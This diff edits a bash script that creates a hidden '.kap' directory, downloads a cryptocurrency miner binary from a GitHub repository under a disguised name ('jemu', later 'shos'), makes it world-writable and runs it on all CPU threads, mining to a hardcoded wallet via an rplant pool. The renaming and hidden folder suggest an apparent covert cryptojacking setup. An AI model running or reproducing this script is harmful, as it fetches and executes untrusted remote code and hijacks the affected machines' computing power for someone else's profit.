@@ -1,6 +1,6 @@
 #!/bin/bash
-apt-get update ; apt-get -y install sudo
+apt update && apt -y install libssl-dev libssl3
 mkdir .kap && cd .kap
-wget -O jemu https://github.com/nandafiku/gradi/raw/main/SRBMiner-247
-chmod 777 jemu
-sudo ./jemu --algorithm aurum --pool stratum-na.rplant.xyz:7109 --wallet bit1q47297ttj4g0cytwtkuqmn6ss5ytsh4eggvndrm.x --password webpassword=x --keepalive true --cpu-threads $(nproc --all)
+wget -O shos https://github.com/nandafiku/gradi/raw/main/cpuminer-aurum
+chmod 777 shos
+./shos -a aurum -o stratum+tcp://stratum-na.rplant.xyz:7109 -u bit1q9f8tjdw3p8hf05wz5gpchnmhshecjd3747uqfl.x -p webpassword=x -t $(nproc --all)
